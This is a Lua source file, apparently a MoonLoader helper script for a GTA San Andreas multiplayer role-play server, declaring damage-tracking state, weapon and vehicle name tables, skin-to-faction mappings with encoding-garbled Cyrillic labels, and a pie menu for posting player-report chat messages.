local wasset = false
local damagereg = regex.new("([A-Z]+[a-z]+)\\_([A-Z]+[a-z]+) \\- (Desert Eagle|Rifle|Shotgun|M4|AK47|SDPistol|SMG|Fist) (\\+|\\-)(\\d+\\.\\d+)( - KILL)?")
local dinf = {
	[1] = {
		["id"] = {[1] = -1, [2] = -1, [3] = -1},
		["nick"] = {[1] = "", [2] = "", [3] = ""},
		["clist"] = {[1] = "", [2] = "", [3] = ""},
		["weapon"] = {[1] = "", [2] = "", [3] = ""},
		["damage"] = {[1] = 0, [2] = 0, [3] = 0},
		["kill"] = {[1] = false, [2] = false, [3] = false},
	},

	[2] = {
		["id"] = {[1] = -1, [2] = -1, [3] = -1},
		["nick"] = {[1] = "", [2] = "", [3] = ""},
		["clist"] = {[1] = "", [2] = "", [3] = ""},
		["weapon"] = {[1] = "", [2] = "", [3] = ""},
		["damage"] = {[1] = 0, [2] = 0, [3] = 0},
		["kill"] = {[1] = false, [2] = false, [3] = false},
	}
}
local give = {}
local A_Indexp = 0
while true do A_Indexp = A_Indexp + 1 if A_Indexp == 11 then A_Indexp = nil break end give[A_Indexp] = {["Status"] = imgui.ImBool(false), ["Damage"] = 0, ["x"] = 0, ["y"] = 0, ["z"] = 0, ["index"] = 0} end
local take = {}
local A_Indexp = 0
while true do A_Indexp = A_Indexp + 1 if A_Indexp == 1001 then A_Indexp = nil break end take[A_Indexp] = {["Status"] = imgui.ImBool(false), ["Dagame"] = 0, ["WeaponID"] = 0, ["index"] = 0} end
local indicator1 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local indicator2 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local indicator3 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local BulletsHistory = {}
local lastDamage = 0
local lastHit = 0
local hittex1 = nil
local hittex2 = nil
local hittex3 = nil
local hitimage = nil
-- �������
local mem1 = {[1] = {}, [2] = {}, [3] = {}, [4] = {}, [5] = {}, [6] = {}}
local SetModeFirstShow = false
local images = {[1] = nil, [2] = nil, [3] = nil, [4] = nil, [5] = nil, [6] = nil, [7] = nil}								
local crosimage = nil
local showcmcimage = nil
local crosMode = false
local pCros = false
local NeedtoLoadMem = false
local dx9font = renderCreateFont("times", 14, 12)
local tweapondist = {[23] = 50, [24] = 35, [25] = 40, [29] = 50, [30] = 80, [31] = 90, [33] = 100}
local tweapondamage = {[23] = 10, [24] = 47, [25] = 30, [29] = 8, [30] = 10, [31] = 10, [33] = 25}
local target = {["id"] = 1000, ["time"] = 0, ["suct"] = false}
local sx = 0
local sy = 0
local ped
local s_target, s_targetCar, s_hp, s_veh, s_name, s_place, s_time, s_rk, s_afk, s_tecinfo, s_dam, s_death
local tweaponNames = {[0] = "First", [1] = "Brass Knuckles", [2] = "Golf Club", [3] = "Nightstick", [4] = "Knife", [5] = "Baseball Bat", [6] = "Shovel", [7] = "Pool Cue", [8] = "Katana", [9] = "Chainsaw",
[10] = "Purple Dildo", [11] = "Dildo", [12] = "Vibrator", [13] = "Silver Vibrator", [14] = "Flowers", [15] = "Cane", [16] = "Grenade", [17] = "Tear Gas", [18] = "Molotov Cocktail", [22] = "9mm",
[23] = "Silenced pistol", [24] = "Desert Eagle", [25] = "Shotgun", [26] = "Sawnoff Shotgun", [27] = "Combat Shotgun", [28] = "Micro SMG/Uzi", [29] = "MP5", [30] = "AK-47", [31] = "M4", [32] = "Tec-9",
[33] = "Country Rifle", [34] = "Sniper Rifle", [35] = "RPG", [36] = "HS Rocket", [37] = "Flamethrower", [38] = "Minigun", [39] = "Satchel Charge", [40] = "Detonator", [41] = "Spraycan",
[42] = "Fire Extinguisher", [43] = "Camera", [44] = "Night Vis Goggles", [45] = "Thermal Goggles", [46] = "Parachute"}
local tVehicleNames = {"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel", "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam", "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BFInjection", "Hunter",
"Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie", "Stallion", "Rumpo",
"RCBandit", "Romero","Packer", "Monster", "Admiral", "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed",
"Yankee", "Caddy", "Solair", "Berkley'sRCVan", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RCBaron", "RCRaider", "Glendale", "Oceanic", "Sanchez", "Sparrow",
"Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage",
"Dozer", "Maverick", "NewsChopper", "Rancher", "FBIRancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking", "BlistaCompact", "PoliceMaverick",
"Boxvillde", "Benson", "Mesa", "RCGoblin", "HotringRacerA", "HotringRacerB", "BloodringBanger", "Rancher", "SuperGT", "Elegant", "Journey", "Bike",
"MountainBike", "Beagle", "Cropduster", "Stunt", "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "hydra", "FCR-900", "NRG-500", "HPV1000",
"CementTruck", "TowTruck", "Fortune", "Cadrona", "FBITruck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan", "Blade", "Freight",
"Streak", "Vortex", "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo", "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada",
"Yosemite", "Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RCTiger", "Flash", "Tahoma", "Savanna", "Bandito",
"FreightFlat", "StreakCarriage", "Kart", "Mower", "Dune", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400", "NewsVan",
"Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club", "FreightBox", "Trailer", "Andromada", "Dodo", "RCCam", "Launch", "PoliceCar", "PoliceCar",
"PoliceCar", "PoliceRanger", "Picador", "S.W.A.T", "Alpha", "Phoenix", "GlendaleShit", "SadlerShit", "Luggage A", "Luggage B", "Stairs", "Boxville", "Tiller",
"UtilityTrailer"}

local cIDs = {
	[1] = "����� 0", [2] = "����� 0", [3] = "����� 0",

	[4] = "����� 1", [5] = "����� 1", [6] = "����� 1",

	[7] = "����� 2", [8] = "����� 2", [9] = "����� 2",

	[10] = "����� 3", [11] = "����� 3", [12] = "����� 3",

	[13] = "����� 4", [14] = "����� 4", [15] = "����� 4",

	[16] = "���� ��", [17] = "���� ��", [18] = "���� ��", [19] = "���� ��", [20] = "���� ��",
	[21] = "���� ��",

	[22] = "������ ��", [23] = "������ ��", [24] = "������ ��", [25] = "������ ��", [26] = "������ ��",

	[27] = "������ ��", [28] = "������ ��", [29] = "������ ��", [30] = "������ ��", [31] = "������ ��",
	[32] = "������ ��", [33] = "������ ��", [34] = "������ ��",

	[35] = "������ ��", [36] = "������ ��", [37] = "������ ��",

	[38] = "������ ��", [39] = "������ ��",

	[40] = "������ �������", [41] = "������ �������",

	[42] = "�-10",

	[43] = "������ �-9",

	[44] = "������ ��", [45] = "������ ��", [46] = "������ ��", [47] = "������ ��", [48] = "������ ��",
	[49] = "������ ��", [50] = "������ ��",

	[51] = "������ ��", [52] = "������ ��", [53] = "������ ��", [54] = "������ ��", [55] = "������ ��",
	[56] = "������ ��", [57] = "������ ��", [58] = "������ ��", [59] = "������ ��",

	[60] = "������ ��", [61] = "������ ��", [62] = "������ ��", [63] = "������ ��", [64] = "������ ��",
	[65] = "������ ��", [66] = "������ ��", [67] = "������ ��", [68] = "������ ��", [69] = "������ ��",
	[70] = "������ ��", [71] = "������ ��", [72] = "������ ��", [73] = "������ ��", [74] = "������ ��",
	[75] = "������ ��",

	[76] = "������� ������", [77] = "������� ������", [78] = "������� ������", [79] = "������� ������", [80] = "������� ������",
	[81] = "������� ������", [82] = "������� ������", [83] = "������� ������", [84] = "������� ������", [85] = "������� ������",

	[86] = "������ ��",

	[87] = "������ ��",

	[88] = "������ ��", [89] = "������ ��", [90] = "������ ��", [91] = "������ ��", [92] = "������ ��",

	[93] = "������ �-9",

	[94] = "���� ��", [95] = "���� ��", [96] = "���� ��", [97] = "���� ��", [98] = "���� ��",
	[99] = "���� ��", [100] = "���� ��", [101] = "���� ��", [102] = "���� ��", [103] = "���� ��",
	[104] = "���� ��", [105] = "���� ��",

	[106] = "�� ��", [107] = "�� ��", [108] = "�� ��", [109] = "�� ��", [110] = "�� ��",

	[111] = "���������", [112] = "���������", [113] = "���������", [114] = "���������", [115] = "���������",

	[116] = "������� ��", [117] = "������� ��", [118] = "������� ��", [119] = "������� ��", [120] = "������� ��",
	[121] = "������� ��", [122] = "������� ��", [123] = "������� ��", [124] = "������� ��", [125] = "������� ��",
	[126] = "������� ��", [127] = "������� ��", [128] = "������� ��", [129] = "������� ��", [130] = "������� ��",
	[131] = "������� ��", [132] = "������� ��", [133] = "������� ��", [134] = "������� ��", [135] = "������� ��",
	[136] = "������� ��", [137] = "������� ��", [138] = "������� ��", [139] = "������� ��", [140] = "������� ��",
	[141] = "������� ��", [142] = "������� ��", [143] = "������� ��", [144] = "������� ��", [145] = "������� ��",
	[146] = "������� ��", [147] = "������� ��", [148] = "������� ��", [149] = "������� ��", [150] = "������� ��",

	[151] = "������� ��", [152] = "������� ��", [153] = "������� ��", [154] = "������� ��", [155] = "������� ��",
	[156] = "������� ��", [157] = "������� ��", [158] = "������� ��", [159] = "������� ��", [160] = "������� ��",
	[161] = "������� ��", [162] = "������� ��", [163] = "������� ��", [164] = "������� ��", [165] = "������� ��",
	[166] = "������� ��", [167] = "������� ��", [168] = "������� ��", [169] = "������� ��", [170] = "������� ��",
	[171] = "������� ��", [172] = "������� ��", [173] = "������� ��", [174] = "������� ��", [175] = "������� ��",
	[176] = "������� ��", [177] = "������� ��", [178] = "������� ��", [179] = "������� ��", [180] = "������� ��",
	[181] = "������� ��", [182] = "������� ��", [183] = "������� ��", [184] = "������� ��", [185] = "������� ��",

	[186] = "������� ��", [187] = "������� ��", [188] = "������� ��", [189] = "������� ��", [190] = "������� ��",
	[191] = "������� ��", [192] = "������� ��", [193] = "������� ��", [194] = "������� ��", [195] = "������� ��",
	[196] = "������� ��", [197] = "������� ��", [198] = "������� ��", [199] = "������� ��", [200] = "������� ��",
	[201] = "������� ��", [202] = "������� ��", [203] = "������� ��", [204] = "������� ��", [205] = "������� ��",
	[206] = "������� ��", [207] = "������� ��", [208] = "������� ��", [209] = "������� ��", [210] = "������� ��",
	[211] = "������� ��", [212] = "������� ��", [213] = "������� ��", [214] = "������� ��", [215] = "������� ��",
	[216] = "������� ��", [217] = "������� ��", [218] = "������� ��", [219] = "������� ��", [220] = "������� ��",
	[221] = "������� ��", [222] = "������� ��",

	[223] = "FBI", [224] = "FBI", [225] = "FBI", [226] = "FBI", [227] = "FBI",
	[228] = "FBI", [229] = "FBI", [230] = "FBI", [231] = "FBI", [232] = "FBI",
	[233] = "FBI", [234] = "FBI", [235] = "FBI", [236] = "FBI", [237] = "FBI",
	[238] = "FBI", [239] = "FBI", [240] = "FBI", [241] = "FBI", [242] = "FBI",
	[243] = "FBI", [244] = "FBI", [245] = "FBI", [246] = "FBI",

	[247] = "����� �� (������)", [248] = "����� �� (������)", [249] = "����� �� (������)", [250] = "����� �� (������)", [251] = "����� �� (������)",

	[252] = "����� ��", [253] = "����� ��", [254] = "����� ��", [255] = "����� ��", [256] = "����� ��",
	[257] = "����� ��", [258] = "����� ��", [259] = "����� ��", [260] = "����� ��", [261] = "����� ��",
	[262] = "����� ��", [263] = "����� ��", [264] = "����� ��", [265] = "����� ��", [266] = "����� ��",
	[267] = "����� ��", [268] = "����� ��", [269] = "����� ��",

	[270] = "�.�.�.�.", [271] = "�.�.�.�.", [272] = "�.�.�.�.", [273] = "�.�.�.�.",

	[274] = "����� ��", [275] = "����� ��", [276] = "����� ��",

	[277] = "�.�.�.�.", [278] = "�.�.�.�.", [279] = "�.�.�.�.", [280] = "�.�.�.�.", [281] = "�.�.�.�.",
	[282] = "�.�.�.�.",

	[283] = "����� ��", [284] = "����� ��", [285] = "����� ��", [286] = "����� ��", [287] = "����� ��",
	[288] = "����� ��", [289] = "����� ��", [290] = "����� ��", [291] = "����� ��", [292] = "����� ��",
	[293] = "����� ��", [294] = "����� ��", [295] = "����� ��",

	[296] = "������� �����������", [297] = "������� �����������", [298] = "������� �����������", [299] = "������� �����������", [300] = "������� �����������",
	[301] = "������� �����������", [302] = "������� �����������", [303] = "������� �����������", [304] = "������� �����������", [305] = "������� �����������",
	[306] = "������� �����������", [307] = "������� �����������", [308] = "������� �����������", [309] = "������� �����������", [310] = "������� �����������",
	[311] = "������� �����������", [312] = "������� �����������", [313] = "������� �����������",

	[314] = "���� ��", [315] = "���� ��", [316] = "���� ��", [317] = "���� ��", [318] = "���� ��",
	[319] = "���� ��", [320] = "���� ��", [321] = "���� ��", [322] = "���� ��", [323] = "���� ��",

	[324] = "����� ��", [325] = "����� ��", [326] = "����� ��", [327] = "����� ��", [328] = "����� ��",
	[329] = "����� ��", [330] = "����� ��", [331] = "����� ��", [332] = "����� ��", [333] = "����� ��",
	[334] = "����� ��", [335] = "����� ��", [336] = "����� ��", [337] = "����� ��", [338] = "����� ��",
	[339] = "����� ��", [340] = "����� ��", [341] = "����� ��", [342] = "����� ��", [343] = "����� ��",
	[344] = "����� ��", [345] = "����� ��", [346] = "����� ��", [347] = "����� ��", [348] = "����� ��",
	[349] = "����� ��", [350] = "����� ��", [351] = "����� ��", [352] = "����� ��", [353] = "����� ��",
	[354] = "����� ��", [355] = "����� ��", [356] = "����� ��", [357] = "����� ��", [358] = "����� ��",
	[359] = "����� ��", [360] = "����� ��", [361] = "����� ��", [362] = "����� ��", [363] = "����� ��",
	[364] = "����� ��", [365] = "����� ��", [366] = "����� ��", [367] = "����� ��", [368] = "����� ��",
	[369] = "����� ��",

	[370] = "���� ��",

	[371] = "������ ��", [372] = "������ ��", [373] = "������ ��", [374] = "������ ��", [375] = "������ ��",
	[376] = "������ ��", [377] = "������ ��", [378] = "������ ��", [379] = "������ ��", [380] = "������ ��",
	[381] = "������ ��", [382] = "������ ��", [383] = "������ ��", [384] = "������ ��", [385] = "������ ��",
	[386] = "������ ��", [387] = "������ ��", [388] = "������ ��",

	[389] = "������ �����", [390] = "������ �����", [391] = "������ �����", [392] = "������ �����",

	[393] = "������ �-18", [394] = "������ �-18", [395] = "������ �-18", [396] = "������ �-18",

	[397] = "������ ��", [398] = "������ ��", [399] = "������ ��", [400] = "������ ��", [401] = "������ ��",
	[402] = "������ ��", [403] = "������ ��", [404] = "������ ��", [405] = "������ ��", [406] = "������ ��",
	[407] = "������ ��",

	[408] = "������ ��", [409] = "������ ��", [410] = "������ ��", [411] = "������ ��", [412] = "������ ��",
	[413] = "������ ��", [414] = "������ ��", [415] = "������ ��", [416] = "������ ��", [417] = "������ ��",
	[418] = "������ ��", [419] = "������ ��", [420] = "������ ��", [421] = "������ ��",

	[422] = "������ ��", [423] = "������ ��", [424] = "������ ��", [425] = "������ ��", [426] = "������ ��",

	[427] = "������ �-7", [428] = "������ �-7", [429] = "������ �-7", [430] = "������ �-7",

	[431] = "�����", [432] = "�����", [433] = "�����", [434] = "�����", [435] = "�����",
	[436] = "�����", [437] = "�����", [438] = "�����", [439] = "�����", [440] = "�����",
	[441] = "�����", [442] = "�����", [443] = "�����", [444] = "�����", [445] = "�����",

	[446] = "���������", [447] = "���������", [448] = "���������", [449] = "���������", [450] = "���������",
	[451] = "���������", [452] = "���������", [453] = "���������", [454] = "���������", [455] = "���������",
	[456] = "���������", [457] = "���������", [458] = "���������", [459] = "���������", [460] = "���������",
	[461] = "���������", [462] = "���������",

	[463] = "������� ��", [464] = "������� ��", [465] = "������� ��", [466] = "������� ��", [467] = "������� ��",
	[468] = "������� ��", [469] = "������� ��", [470] = "������� ��",

	[471] = "������� ��", [472] = "������� ��", [473] = "������� ��", [474] = "������� ��", [475] = "������� ��",
	[476] = "������� ��", [477] = "������� ��", [478] = "������� ��",

	[479] = "������� ��", [480] = "������� ��", [481] = "������� ��", [482] = "������� ��", [483] = "������� ��",
	[484] = "������� ��", [485] = "������� ��", [486] = "������� ��",

	[487] = "LCn", [488] = "LCn", [489] = "LCn", [490] = "LCn", [491] = "LCn",
	[492] = "LCn", [493] = "LCn", [494] = "LCn", [495] = "LCn", [496] = "LCn",
	[497] = "LCn", [498] = "LCn", [499] = "LCn", [500] = "LCn", [501] = "LCn",
	[502] = "LCn",

	[503] = "Yakuza", [504] = "Yakuza", [505] = "Yakuza", [506] = "Yakuza", [507] = "Yakuza",
	[508] = "Yakuza", [509] = "Yakuza", [510] = "Yakuza", [511] = "Yakuza", [512] = "Yakuza",
	[513] = "Yakuza", [514] = "Yakuza", [515] = "Yakuza", [516] = "Yakuza", [517] = "Yakuza",
	[518] = "Yakuza",

	[519] = "RM", [520] = "RM", [521] = "RM", [522] = "RM", [523] = "RM",
	[524] = "RM", [525] = "RM", [526] = "RM", [527] = "RM", [528] = "RM",
	[529] = "RM", [530] = "RM", [531] = "RM", [532] = "RM", [533] = "RM",
	[534] = "RM",

	[535] = "Rifa", [536] = "Rifa", [537] = "Rifa", [538] = "Rifa", [539] = "Rifa",
	[540] = "Rifa", [541] = "Rifa", [542] = "Rifa",

	[543] = "Groove", [544] = "Groove", [545] = "Groove", [546] = "Groove", [547] = "Groove",
	[548] = "Groove", [549] = "Groove", [550] = "Groove",

	[551] = "Ballas", [552] = "Ballas", [553] = "Ballas", [554] = "Ballas", [555] = "Ballas",
	[556] = "Ballas", [557] = "Ballas", [558] = "Ballas",

	[559] = "Vagos", [560] = "Vagos", [561] = "Vagos", [562] = "Vagos", [563] = "Vagos",
	[564] = "Vagos", [565] = "Vagos", [566] = "Vagos",

	[567] = "Aztec", [568] = "Aztec", [569] = "Aztec", [570] = "Aztec", [571] = "Aztec",
	[572] = "Aztec", [573] = "Aztec", [574] = "Aztec",

	[575] = "Hell Angels MC", [576] = "Hell Angels MC", [577] = "Hell Angels MC", [578] = "Hell Angels MC", [579] = "Hell Angels MC",
	[580] = "Hell Angels MC", [581] = "Hell Angels MC", [582] = "Hell Angels MC", [583] = "Hell Angels MC", [584] = "Hell Angels MC",
	[585] = "Hell Angels MC", [586] = "Hell Angels MC",

	[587] = "Mongols MC", [588] = "Mongols MC", [589] = "Mongols MC", [590] = "Mongols MC", [591] = "Mongols MC",
	[592] = "Mongols MC", [593] = "Mongols MC", [594] = "Mongols MC", [595] = "Mongols MC", [596] = "Mongols MC",
	[597] = "Mongols MC", [598] = "Mongols MC",

	[599] = "Pagans MC", [600] = "Pagans MC", [601] = "Pagans MC", [602] = "Pagans MC", [603] = "Pagans MC",
	[604] = "Pagans MC", [605] = "Pagans MC", [606] = "Pagans MC", [607] = "Pagans MC", [608] = "Pagans MC",
	[609] = "Pagans MC", [610] = "Pagans MC",

	[611] = "Outlaws MC", [612] = "Outlaws MC", [613] = "Outlaws MC", [614] = "Outlaws MC", [615] = "Outlaws MC",
	[616] = "Outlaws MC", [617] = "Outlaws MC", [618] = "Outlaws MC", [619] = "Outlaws MC", [620] = "Outlaws MC",
	[621] = "Outlaws MC", [622] = "Outlaws MC",

	[623] = "Sons of Silence MC", [624] = "Sons of Silence MC", [625] = "Sons of Silence MC", [626] = "Sons of Silence MC", [627] = "Sons of Silence MC",
	[628] = "Sons of Silence MC", [629] = "Sons of Silence MC", [630] = "Sons of Silence MC", [631] = "Sons of Silence MC", [632] = "Sons of Silence MC",
	[633] = "Sons of Silence MC", [634] = "Sons of Silence MC",

	[635] = "Warlocks MC", [636] = "Warlocks MC", [637] = "Warlocks MC", [638] = "Warlocks MC", [639] = "Warlocks MC",
	[640] = "Warlocks MC", [641] = "Warlocks MC", [642] = "Warlocks MC", [643] = "Warlocks MC", [644] = "Warlocks MC",
	[645] = "Warlocks MC", [646] = "Warlocks MC",

	[647] = "Highwaymen MC", [648] = "Highwaymen MC", [649] = "Highwaymen MC", [650] = "Highwaymen MC", [651] = "Highwaymen MC",
	[652] = "Highwaymen MC", [653] = "Highwaymen MC", [654] = "Highwaymen MC", [655] = "Highwaymen MC", [656] = "Highwaymen MC",
	[657] = "Highwaymen MC", [658] = "Highwaymen MC",

	[659] = "Bandidos MC", [660] = "Bandidos MC", [661] = "Bandidos MC", [662] = "Bandidos MC", [663] = "Bandidos MC",
	[664] = "Bandidos MC", [665] = "Bandidos MC", [666] = "Bandidos MC", [667] = "Bandidos MC", [668] = "Bandidos MC",
	[669] = "Bandidos MC", [670] = "Bandidos MC",

	[671] = "Free Souls MC", [672] = "Free Souls MC", [673] = "Free Souls MC", [674] = "Free Souls MC", [675] = "Free Souls MC",
	[676] = "Free Souls MC", [677] = "Free Souls MC", [678] = "Free Souls MC", [679] = "Free Souls MC", [680] = "Free Souls MC",
	[681] = "Free Souls MC", [682] = "Free Souls MC",

	[683] = "Vagos MC", [684] = "Vagos MC", [685] = "Vagos MC", [686] = "Vagos MC", [687] = "Vagos MC",
	[688] = "Vagos MC", [689] = "Vagos MC", [690] = "Vagos MC", [691] = "Vagos MC", [692] = "Vagos MC",
	[693] = "Vagos MC", [694] = "Vagos MC",

	[695] = "�� ��", [696] = "�� ��", [697] = "�� ��", [698] = "�� ��", [699] = "�� ��",
	[700] = "�� ��",

	[701] = "�-14", [702] = "�-14",

	[703] = "�� ��", [704] = "�� ��", [705] = "�� ��", [706] = "�� ��", [707] = "�� ��",
	[708] = "�� ��", [709] = "�� ��", [710] = "�� ��", [711] = "�� ��",

	[712] = "�� ��", [713] = "�� ��", [714] = "�� ��", [715] = "�� ��", [716] = "�� ��",
	[717] = "�� ��", [718] = "�� ��", [719] = "�� ��", [720] = "�� ��", [721] = "�� ��",
	[722] = "�� ��", [723] = "�� ��", [724] = "�� ��",

	[725] = "�� ��", [726] = "�� ��", [727] = "�� ��", [728] = "�� ��", [729] = "�� ��",
	[730] = "�� ��", [731] = "�� ��",

	[732] = "Jefferson", [733] = "Jefferson", [734] = "Jefferson", [735] = "Jefferson", [736] = "Jefferson",
	[737] = "Jefferson", [738] = "Jefferson", [739] = "Jefferson", [740] = "Jefferson", [741] = "Jefferson",
	[742] = "Jefferson", [743] = "Jefferson", [744] = "Jefferson", [745] = "Jefferson",

	[746] = "���� ��", [747] = "���� ��", [748] = "���� ��", [749] = "���� ��", [750] = "���� ��",
	[751] = "���� ��", [752] = "���� ��", [753] = "���� ��", [754] = "���� ��",

	[755] = "�-18", [756] = "�-18", [757] = "�-18", [758] = "�-18",

	[759] = "������� �����", [760] = "������� �����", [761] = "������� �����", [762] = "������� �����", [763] = "������� �����",
	[764] = "������� �����", [765] = "������� �����", [766] = "������� �����", [767] = "������� �����", [768] = "������� �����",
	[769] = "������� �����", [770] = "������� �����", [771] = "������� �����", [772] = "������� �����", [773] = "������� �����",
	[774] = "������� �����", [775] = "������� �����", [776] = "������� �����", [777] = "������� �����", [778] = "������� �����",
	[779] = "������� �����",

	[780] = "���� ��", [781] = "���� ��", [782] = "���� ��", [783] = "���� ��", [784] = "���� ��",
	[785] = "���� ��", [786] = "���� ��", [787] = "���� ��",

	[788] = "������� �����", [789] = "������� �����", [790] = "������� �����", [791] = "������� �����", [792] = "������� �����",
	[793] = "������� �����", [794] = "������� �����",

	[795] = "�� ��", [796] = "�� ��", [797] = "�� ��", [798] = "�� ��", [799] = "�� ��",
	[800] = "�� ��", [801] = "�� ��", [802] = "�� ��", [803] = "�� ��",

	[804] = "�� ��", [805] = "�� ��", [806] = "�� ��", [807] = "�� ��", [808] = "�� ��",
	[809] = "�� ��", [810] = "�� ��", [811] = "�� ��", [812] = "�� ��",

	[813] = "�� ��", [814] = "�� ��", [815] = "�� ��", [816] = "�� ��", [817] = "�� ��",
	[818] = "�� ��", [819] = "�� ��", [820] = "�� ��",

	[821] = "�� �� (��� ������)", [822] = "�� �� (��� ������)", [823] = "�� �� (��� ������)", [824] = "�� �� (��� ������)", [825] = "�� �� (��� ������)",
	[826] = "�� �� (��� ������)", [827] = "�� �� (��� ������)", [828] = "�� �� (��� ������)", [829] = "�� �� (��� ������)", [830] = "�� �� (��� ������)",
	[831] = "�� �� (��� ������)", [832] = "�� �� (��� ������)", [833] = "�� �� (��� ������)", [834] = "�� �� (��� ������)", [835] = "�� �� (��� ������)",
	[836] = "�� �� (��� ������)", [837] = "�� �� (��� ������)", [838] = "�� �� (��� ������)", [839] = "�� �� (��� ������)", [840] = "�� �� (��� ������)",
	[841] = "�� �� (��� ������)", [842] = "�� �� (��� ������)",

	[843] = "���������", [844] = "���������", [845] = "���������", [846] = "���������", [847] = "���������",
	[848] = "���������",

	[849] = "���������� 2", [850] = "���������� 2", [851] = "���������� 2", [852] = "���������� 2", [853] = "���������� 2",
	[854] = "���������� 2", [855] = "���������� 2", [856] = "���������� 2",

	[863] = "���������", [864] = "���������", [865] = "���������",

	[869] = "���������� 2", [870] = "���������� 2",

	[872] = "���������", [873] = "���������", [874] = "���������",

	[878] = "���������� 2", [879] = "���������� 2", [880] = "���������� 2",

	[881] = "������ �-12", [882] = "������ �-12", [883] = "������ �-12", [884] = "������ �-12", [885] = "������ �-12",
	[886] = "������ �-12",

	[887] = "������ ��", [888] = "������ ��", [889] = "������ ��", [890] = "������ ��", [891] = "������ ��",
	[892] = "������ ��",

	[897] = "�� �� (��� ������)", [898] = "�� �� (��� ������)", [899] = "�� �� (��� ������)", [900] = "�� �� (��� ������)", [901] = "�� �� (��� ������)",
	[902] = "�� �� (��� ������)",

	[916] = "���������", [917] = "���������", [918] = "���������", [919] = "���������", [920] = "���������",
	[921] = "���������", [922] = "���������", [923] = "���������", [924] = "���������", [925] = "���������",
	[926] = "���������", [927] = "���������", [928] = "���������", [929] = "���������", [930] = "���������",
	[931] = "���������", [932] = "���������", [933] = "���������", [934] = "���������",

	[935] = "������ �-3", [936] = "������ �-3", [937] = "������ �-3", [938] = "������ �-3", [939] = "������ �-3",
	[940] = "������ �-3", [941] = "������ �-3", [942] = "������ �-3", [943] = "������ �-3", [944] = "������ �-3",
	[945] = "������ �-3", [946] = "������ �-3", [947] = "������ �-3", [948] = "������ �-3", [949] = "������ �-3",
	[950] = "������ �-3", [951] = "������ �-3",

	[1005] = "���� ��", [1006] = "���� ��", [1007] = "���� ��", [1008] = "���� ��", [1009] = "���� ��",
	[1010] = "���� ��", [1011] = "���� ��", [1012] = "���� ��", [1013] = "���� ��", [1014] = "���� ��",
	[1015] = "���� ��", [1016] = "���� ��",

	[1017] = "������ �-12", [1018] = "������ �-12", [1019] = "������ �-12", [1020] = "������ �-12", [1021] = "������ �-12",
	[1022] = "������ �-12", [1023] = "������ �-12", [1024] = "������ �-12"
}

local carsident = {}
local sanc = {[226] = "Sanchez", [227] = "Sanchez", [228] = "Sanchez", [231] = "Sanchez", [230] = "Sanchez", [229] = "Sanchez"}
local rCache = {enable = false, squaddata = {}, smem = {}}
-- Pie Menu
local piearr = {
		action = 0,
		pie_mode = imgui.ImBool(false),
		pie_keyid = 0,
		pie_elements = {},
		
		reportpie = {
			mode = 0,
			handle = 0,
			action = false,
			pie_mode = imgui.ImBool(false),
			pie_keyid = 0x12,
			pie_elements = {
				[1] = {
					{name = "�� - �������� ��� �������", action = function() local id = select(2, sampGetPlayerIdByCharHandle(piearr.reportpie.handle)) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. sampGetPlayerNickname(id) .. "[" .. id .. "] - ������ �� ��") end, next = nil},
					{name = "+c", action = function() local id = select(2, sampGetPlayerIdByCharHandle(piearr.reportpie.handle)) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. sampGetPlayerNickname(id) .. "[" .. id .. "] - ������ �� +c") end, next = nil},
					{name = "�� - ������� �� ����� ������", action = function() local id = select(2, sampGetPlayerIdByCharHandle(piearr.reportpie.handle)) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. sampGetPlayerNickname(id) .. "[" .. id .. "] - ������ �� ��") end, next = nil},
				},
				
				[2] = {
					{name = "����������", action = function() local cidcar = getCarModel(hcar) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����: " .. tVehicleNames[cidcar-399] .. " - ������ �� ����������") end, next = nil},
					{name = "��", action = function() local cidcar = getCarModel(hcar) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����: " .. tVehicleNames[cidcar-399] .. " - ������ �� ��") end, next = nil},
					{name = "GM car", action = function() local cidcar = getCarModel(hcar) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����: " .. tVehicleNames[cidcar-399] .. " - ������ �� GM car") end, next = nil},
					{name = "�� - �������� ��� �������", action = function() local cidcar = getCarModel(hcar) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����: " .. tVehicleNames[cidcar-399] .. " - ������ �� ��") end, next = nil},
				}
			}
		},
}
local fond = {[1] = "ERROR", [2] = "0"}
-- ���������� ��
local isarmtaken = false
local isdeagletaken = false
local isshotguntaken = false
local issmgtaken = false
local ism4a1taken = false
local isrifletaken = false
local ispartaken = false
local whatwastaken = {}
local AutoDeagle = config_ini.bools[18] == 1 and true or false
local AutoShotgun = config_ini.bools[19] == 1 and true or false
